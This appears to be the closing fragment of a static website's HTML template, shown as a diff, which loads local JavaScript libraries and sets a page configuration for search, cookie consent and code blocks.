+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
